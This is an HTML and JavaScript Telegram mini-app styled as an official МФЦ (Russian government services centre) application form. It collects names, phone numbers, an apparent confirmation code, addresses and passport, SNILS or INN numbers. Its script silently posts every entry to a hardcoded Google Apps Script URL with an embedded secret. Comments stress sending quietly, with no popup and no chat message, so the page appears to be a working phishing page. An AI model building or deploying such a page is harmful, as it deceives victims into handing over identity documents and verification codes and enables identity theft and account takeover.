<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <title>МФЦ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root{--bg:#0f172a;--card:#fff;--text:#0f172a;--muted:#475569;--brand:#0ea5e9}
    *{box-sizing:border-box}html,body{margin:0;padding:0;background:var(--bg);font-family:system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",Arial}
    .wrap{max-width:640px;margin:24px auto;padding:0 16px}
    .card{background:var(--card);border-radius:16px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,.18)}
    h1{margin:0 0 6px;font-size:20px;color:var(--text)}
    p{margin:0 0 16px;color:var(--muted)}
    .row{display:flex;gap:12px}
    .row .field{flex:1}
    label{display:block;font-size:13px;margin:10px 0 6px;color:var(--muted)}
    input,select{width:100%;padding:12px;border:1px solid #e5e7eb;border-radius:12px;font-size:15px}
    .btn{width:100%;margin-top:16px;padding:14px;border:0;border-radius:12px;background:var(--brand);color:#fff;font-size:16px;cursor:pointer}
    .btn:active{opacity:.92}
    #loading{display:none;margin-top:10px;font-size:13px;color:var(--muted)}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>Заявка МФЦ</h1>
      <p>Заполните поля и нажмите «Отправить» — данные тихо запишутся в таблицу.</p>

      <div class="field">
        <label>ФИО</label>
        <input id="fullname" placeholder="Иванов Иван Иванович" />
      </div>

      <div class="row">
        <div class="field">
          <label>Телефон</label>
          <input id="phone" placeholder="+7 900 000-00-00" />
        </div>
        <div class="field">
          <label>Код</label>
          <input id="code" placeholder="Код" />
        </div>
      </div>

      <div class="field">
        <label>Адрес</label>
        <input id="address" placeholder="Город, улица, дом" />
      </div>

      <div class="row">
        <div class="field">
          <label>Документ (тип)</label>
          <select id="docType">
            <option value="">—</option>
            <option>Паспорт</option>
            <option>СНИЛС</option>
            <option>ИНН</option>
            <option>Водительское удостоверение</option>
          </select>
        </div>
        <div class="field">
          <label>Документ (номер)</label>
          <input id="docNum" placeholder="серия и номер" />
        </div>
      </div>

      <button class="btn" id="submitBtn">Отправить</button>
      <div id="loading">Отправка…</div>
    </div>
  </div>

  <script>
    // URL веб-приложения Apps Script (Web app → .../exec)
    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzPKx98qFbrRyYT0Ia8Yq_MdC6R7KiPfrdd3GAhnxFEQLG2AEBick3EOiCsgU_A3FKi/exec";
    const SECRET = "benhillworkspeisworkhab";

    const tg = window.Telegram?.WebApp;
    tg?.expand();

    function tsLocal() {
      const d = new Date();
      const pad = n => String(n).padStart(2, "0");
      return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
    }

    function buildRecord() {
      const userId = tg?.initDataUnsafe?.user?.id || "";
      const fullname = document.getElementById("fullname").value.trim();
      const phoneRaw = document.getElementById("phone").value.trim();
      const phone = phoneRaw.replace(/\s+/g, "").replace(/[^0-9+]/g,"");
      const address = document.getElementById("address").value.trim();
      const documentType = document.getElementById("docType").value.trim();
      const documentNumber = document.getElementById("docNum").value.trim();
      const code = document.getElementById("code").value.trim();

      return {
        timestamp: tsLocal(),
        fullname,
        phone,
        address,
        document: `${documentType} ${documentNumber}`.trim(),
        code,
        user_id: userId   // нужно Apps Script, чтобы поставить "id <цифры>" в колонку A
      };
    }

    async function sendToSheet(rec) {
      const loading = document.getElementById("loading");
      loading.style.display = "block";
      try {
        // text/plain — без CORS preflight
        const res = await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          headers: { "Content-Type": "text/plain;charset=utf-8" },
          body: JSON.stringify({ type: "lead", payload: rec, secret: SECRET })
        });
        // тихо: без alert/popup
        await res.text();
        tg?.HapticFeedback?.impactOccurred?.("light");
        // tg?.close(); // если нужно закрывать mini app сразу — раскомментируй
      } catch (err) {
        console.error("sendToSheet error:", err);
      } finally {
        loading.style.display = "none";
      }
    }

    // НИЧЕГО не отправляем в бот — значит не будет системного сообщения в чате
    function sendToBotOnce(_) { /* no-op */ }

    document.getElementById("submitBtn").addEventListener("click", async () => {
      const rec = buildRecord();
      await sendToSheet(rec);
      sendToBotOnce(rec); // no-op
    });
  </script>
</body>
</html>
